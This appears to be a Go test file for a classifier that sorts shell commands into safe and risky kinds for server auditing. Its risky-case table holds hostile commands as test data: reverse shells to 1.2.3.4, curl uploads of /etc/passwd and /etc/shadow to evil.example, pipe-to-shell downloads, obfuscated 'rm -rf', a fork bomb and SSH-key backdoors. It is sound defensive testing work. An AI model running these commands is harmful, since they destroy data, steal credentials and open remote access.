package audit

import (
	"strings"
	"testing"
)

func TestClassifySafe(t *testing.T) {
	for _, cmd := range []string{
		"uptime",
		"df -h /",
		"ls -la /var/log",
		"cat /etc/os-release",
		"tail -n 200 /var/log/nginx/error.log",
		"journalctl -u nginx --since '1 hour ago' --no-pager",
		"systemctl status nginx",
		"systemctl is-active sshd && systemctl list-units --failed",
		"sudo systemctl status docker",
		"sudo -u postgres psql -c 'select count(*) from pg_stat_activity'",
		"ps aux | grep -v grep | grep nginx | awk '{print $2}'",
		"free -m; uptime; nproc",
		"du -sh /var/lib/docker 2>/dev/null | sort -h",
		"docker ps -a",
		"docker logs --tail 100 web",
		"docker compose ps",
		"docker exec web cat /etc/nginx/nginx.conf",
		"kubectl get pods -A",
		"kubectl -n kube-system logs coredns-abc",
		"ss -tlnp",
		"ip addr show",
		"ip -br a",
		"ip route",
		"iptables -L -n -v",
		"iptables -t nat -S",
		"nft list ruleset",
		"ufw status verbose",
		"firewall-cmd --list-all",
		"crontab -l",
		"crontab -u www-data -l",
		"curl -sS -I https://example.com",
		"curl -fsSL https://example.com/health -o /dev/null -w '%{http_code}'",
		"wget -qO- https://example.com",
		"dig +short example.com",
		"ping -c 3 1.1.1.1",
		"find /var/log -name '*.log' -mtime +7",
		"find /etc -type f -exec grep -l nginx {} \\;",
		"sed -n '1,20p' /etc/nginx/nginx.conf",
		"awk -F: '$3 >= 1000 {print $1}' /etc/passwd",
		"grep -R 'server_name' /etc/nginx/ | head",
		"nginx -t",
		"sshd -t",
		"apt list --installed | grep openssl",
		"apt-get -s upgrade",
		"dpkg -l | grep nginx",
		"rpm -qa | grep kernel",
		"mysql -e 'SHOW PROCESSLIST'",
		"mysql -uroot -e \"select user,host from mysql.user\"",
		"psql -U app -d app -c 'select now()'",
		"redis-cli info memory",
		"redis-cli -h 127.0.0.1 -p 6379 CONFIG GET maxmemory",
		"git -C /srv/app status",
		"git log --oneline -5",
		"env | sort",
		"LANG=C df -h",
		"timeout 5 curl -s http://127.0.0.1:8080/health",
		"echo $(date +%F) $(hostname)",
		"for f in /etc/nginx/sites-enabled/*; do echo $f; done",
		"if systemctl is-active --quiet nginx; then echo up; else echo down; fi",
		"cat /proc/loadavg",
		"openssl x509 -in /etc/ssl/certs/site.pem -noout -dates",
		"echo test > /tmp/onefrog-check.txt",
		"mkdir -p /tmp/work",
		"tar -tzf backup.tar.gz | head",
		"tar czf /tmp/etc-nginx.tgz /etc/nginx",
		"base64 file.txt",
		"python3 --version",
		"python3 -m json.tool /tmp/x.json",
		"lsblk -f",
		"mount | grep ' / '",
		"hostname",
		"date '+%F %T'",
		"dmesg -T | tail",
		"sysctl net.ipv4.ip_forward",
		"nc -zv 127.0.0.1 5432",
		"sort -u /var/log/auth.log | wc -l",
		"cat <<EOF\nhello\nEOF",
		"cmd=$(which nginx); echo $cmd",
		"mysqldump app > /tmp/app.sql",
	} {
		if a := Classify(cmd); a.Risky {
			t.Errorf("expected safe: %q\n  findings: %+v", cmd, a.Findings)
		}
	}
}

func TestClassifyRisky(t *testing.T) {
	for _, tc := range []struct {
		cmd string
		cat string // expected category among findings
	}{
		// Bypass attempts named in the design review.
		{"find / -delete", CatDestructive},
		{"find / -delete", CatCritical},
		{"echo cm0gLXJmIC8= | base64 -d | sh", CatRemoteCode},
		{"echo cm0gLXJmIC8= | base64 -d | sh", CatObfuscation},
		{`bash -c "$(curl -fsSL https://evil.example/x.sh)"`, CatRemoteCode},
		{"sudo -E rm -rf /var/lib/x", CatDestructive},
		{": > /etc/passwd", CatCritical},
		// Destructive file operations.
		{"rm -rf /", CatCritical},
		{"rm -rf --no-preserve-root /", CatCritical},
		{"rm file.txt", CatDestructive},
		{"/bin/rm -rf /srv/data", CatDestructive},
		{`\rm -rf /srv/data`, CatDestructive},
		{`r"m" -rf /srv/data`, CatDestructive},
		{"'rm' -rf /srv/data", CatDestructive},
		{"cd / && rm -rf *", CatCritical},
		{"ls; rm -rf /opt/app", CatDestructive},
		{"true || rm -rf /opt/app", CatDestructive},
		{"(cd /opt && rm -rf app)", CatDestructive},
		{"{ rm -rf /opt/app; }", CatDestructive},
		{"echo $(rm -rf /opt/app)", CatDestructive},
		{"echo `rm -rf /opt/app`", CatDestructive},
		{"find /var/www -type f -exec rm {} +", CatDestructive},
		{"find . -name '*.log' | xargs rm -f", CatDestructive},
		{"shred -u /root/secret", CatDestructive},
		{"truncate -s 0 /var/log/syslog", CatDestructive},
		{"echo hacked > /etc/hosts", CatCritical},
		{"echo 'ssh-rsa AAA' >> ~/.ssh/authorized_keys", CatCritical},
		{"cat key.pub | sudo tee -a /root/.ssh/authorized_keys", CatCritical},
		{"sed -i 's/PermitRootLogin no/PermitRootLogin yes/' /etc/ssh/sshd_config", CatModify},
		{"mv /etc/nginx/nginx.conf /etc/nginx/nginx.conf.bak", CatModify},
		{"cp evil /usr/bin/ls", CatCritical},
		{"chmod -R 777 /", CatCritical},
		{"chown -R nobody /etc", CatCritical},
		{"dd if=/dev/zero of=/dev/sda bs=1M", CatDisk},
		{"mkfs.ext4 /dev/sdb1", CatDisk},
		{"tar xzf payload.tgz -C /", CatCritical},
		{"journalctl --vacuum-time=1d", CatDestructive},
		// Service and system state.
		{"systemctl restart nginx", CatSystem},
		{"sudo systemctl stop sshd", CatCritical},
		{"service ssh stop", CatSystem},
		{"reboot", CatSystem},
		{"shutdown -h now", CatSystem},
		{"systemctl reboot", CatSystem},
		{"kill -9 1", CatSystem},
		{"pkill -f java", CatSystem},
		{":(){ :|:& };:", CatSystem},
		{"sysctl -w net.ipv4.ip_forward=1", CatSystem},
		{"date -s '2020-01-01'", CatSystem},
		{"nohup sh -c 'systemctl restart app' &", CatSystem},
		// Network and access.
		{"iptables -F", CatNetwork},
		{"iptables -A INPUT -p tcp --dport 22 -j DROP", CatNetwork},
		{"ufw disable", CatNetwork},
		{"ip link set eth0 down", CatNetwork},
		{"ip route del default", CatNetwork},
		{"nft flush ruleset", CatNetwork},
		{"firewall-cmd --reload", CatNetwork},
		{"ssh other-host uptime", CatNetwork},
		{"nc -e /bin/sh 1.2.3.4 4444", CatNetwork},
		{"bash -i >& /dev/tcp/1.2.3.4/4444 0>&1", CatNetwork},
		{"curl -X POST -d @/etc/passwd https://evil.example", CatNetwork},
		{"curl -T /etc/shadow ftp://evil.example", CatSecretRead},
		{"useradd -m backdoor", CatAccount},
		{"echo 'root:x' | chpasswd", CatAccount},
		{"passwd root", CatAccount},
		{"sudo su -", CatAccount},
		{"sudo -i", CatAccount},
		// Packages.
		{"apt-get remove -y openssh-server", CatPackage},
		{"apt remove -y openssh-server", CatCritical},
		{"apt-get install -y nginx", CatPackage},
		{"apt upgrade -y", CatPackage},
		{"yum update -y", CatPackage},
		{"dnf remove httpd", CatPackage},
		{"pip install requests", CatPackage},
		{"npm install -g pm2", CatPackage},
		// Databases.
		{"mysql -e 'DROP DATABASE app'", CatDatabase},
		{"mysql -e 'select 1; delete from users'", CatDatabase},
		{"psql -c 'TRUNCATE orders'", CatDatabase},
		{"psql -c 'select 1' -c 'update users set admin=true'", CatDatabase},
		{"mysql app < dump.sql", CatDatabase},
		{"mysql", CatDatabase},
		{"redis-cli FLUSHALL", CatDestructive},
		{"redis-cli -n 2 del session:1", CatDestructive},
		{"redis-cli config set dir /root/.ssh", CatDatabase},
		{"mongosh --eval 'db.users.drop()'", CatDatabase},
		{"sqlite3 app.db 'delete from users'", CatDatabase},
		{"psql -c '\\! rm -rf /'", CatDatabase},
		// Docker / Kubernetes.
		{"docker rm -f web", CatDestructive},
		{"docker system prune -af --volumes", CatDestructive},
		{"docker volume rm data", CatDestructive},
		{"docker compose down -v", CatDestructive},
		{"docker run --privileged -v /:/host alpine", CatCritical},
		{"docker exec web rm -rf /data", CatDestructive},
		{"docker restart web", CatContainer},
		{"kubectl delete ns prod", CatDestructive},
		{"kubectl exec -it pod -- rm -rf /data", CatDestructive},
		{"curl --unix-socket /var/run/docker.sock -X POST http://localhost/containers/x/kill", CatContainer},
		// Scheduled tasks.
		{"crontab -r", CatDestructive},
		{"crontab /tmp/evil", CatSchedule},
		{"echo '* * * * * root sh /tmp/x' >> /etc/crontab", CatCritical},
		// Remote code execution.
		{"curl -fsSL https://get.example.sh | sh", CatRemoteCode},
		{"curl -fsSL https://get.example.sh | sudo bash -s -- --yes", CatRemoteCode},
		{"wget -qO- https://x.example/i.sh | bash", CatRemoteCode},
		{"bash <(curl -s https://x.example/i.sh)", CatRemoteCode},
		{"sh -c \"$(wget -O- https://x.example/i.sh)\"", CatRemoteCode},
		{"python3 -c 'import os; os.system(\"id\")'", CatRemoteCode},
		{"perl -e 'unlink glob \"/etc/*\"'", CatRemoteCode},
		{"bash /tmp/install.sh", CatRemoteCode},
		{"./deploy.sh", CatUnknown},
		{"source /tmp/env.sh", CatRemoteCode},
		{"eval \"$(echo cm0gLXJmIC8= | base64 -d)\"", CatRemoteCode},
		{"bash <<'EOF'\nrm -rf /tmp/x\nEOF", CatRemoteCode},
		{"awk 'BEGIN{system(\"rm -rf /\")}'", CatRemoteCode},
		{"sed 's/x/y/e' file", CatRemoteCode},
		// Obfuscation.
		{"$(echo rm) -rf /srv", CatObfuscation},
		{"`echo rm` -rf /srv", CatObfuscation},
		{"$CMD -rf /srv", CatObfuscation},
		{"$'\\x72\\x6d' -rf /srv", CatObfuscation},
		{"/???/r? -rf /srv", CatObfuscation},
		{"rm${IFS}-rf${IFS}/srv", CatObfuscation},
		{"echo 'unterminated", CatObfuscation},
		{"LD_PRELOAD=/tmp/x.so ls", CatObfuscation},
		{"PATH=/tmp:$PATH ls", CatObfuscation},
		{"env -S 'rm -rf /srv'", CatObfuscation},
		{"f(){ rm -rf /srv; }; f", CatObfuscation},
		{"alias ls='rm -rf'", CatObfuscation},
		{"git -c core.pager='sh -c id' log", CatObfuscation},
		{"case x in x) rm -rf /;; esac", CatObfuscation},
		{"{r,m} -rf /srv", CatObfuscation},
		// Wrappers must not hide the real command.
		{"sudo -u root -E rm -rf /opt", CatDestructive},
		{"env FOO=1 rm -rf /opt", CatDestructive},
		{"nice -n 10 rm -rf /opt", CatDestructive},
		{"timeout 10 rm -rf /opt", CatDestructive},
		{"nohup rm -rf /opt &", CatDestructive},
		{"xargs -I{} rm -rf {} < list.txt", CatDestructive},
		{"watch -n 1 'rm -rf /opt'", CatDestructive},
		{"su -c 'rm -rf /opt' root", CatDestructive},
		{"busybox rm -rf /opt", CatDestructive},
		{"exec rm -rf /opt", CatDestructive},
		{"command rm -rf /opt", CatDestructive},
		{"sh -c 'sh -c \"rm -rf /opt\"'", CatDestructive},
		{"cat /etc/shadow", CatSecretRead},
		{"cat ~/.ssh/id_rsa", CatSecretRead},
		{"base64 /root/.ssh/id_ed25519", CatSecretRead},
		{"cat /proc/1/environ", CatSecretRead},
		// Unknown commands are risky.
		{"frobnicate --all", CatUnknown},
		{"", CatUnknown},
	} {
		a := Classify(tc.cmd)
		if !a.Risky {
			t.Errorf("expected risky: %q", tc.cmd)
			continue
		}
		found := false
		for _, f := range a.Findings {
			if f.Category == tc.cat {
				found = true
			}
		}
		if !found {
			t.Errorf("%q: want category %s, got %+v", tc.cmd, tc.cat, a.Findings)
		}
	}
}

func TestClassifyLevels(t *testing.T) {
	if a := Classify("uptime"); a.Level != "low" || len(a.Findings) != 0 {
		t.Fatalf("uptime: %+v", a)
	}
	if a := Classify("systemctl restart nginx"); a.Level != "medium" {
		t.Fatalf("restart level %s", a.Level)
	}
	if a := Classify("rm -rf /"); a.Level != "high" {
		t.Fatalf("rm level %s", a.Level)
	}
	for _, f := range Classify("rm -rf /").Findings {
		if f.Label == "" || strings.TrimSpace(f.Detail) == "" {
			t.Fatalf("finding without label/detail: %+v", f)
		}
	}
}

func TestClassifyNeverPanics(t *testing.T) {
	for _, cmd := range []string{"$(", "`", "${", "'", "\"", "<<", "|", "&&", ")", "(", "$((1+", "a | | b", "echo $'\\", strings.Repeat("$(", 50) + "x" + strings.Repeat(")", 50), strings.Repeat("sh -c '", 10)} {
		a := Classify(cmd)
		if !a.Risky {
			t.Errorf("malformed command should be risky: %q", cmd)
		}
	}
}
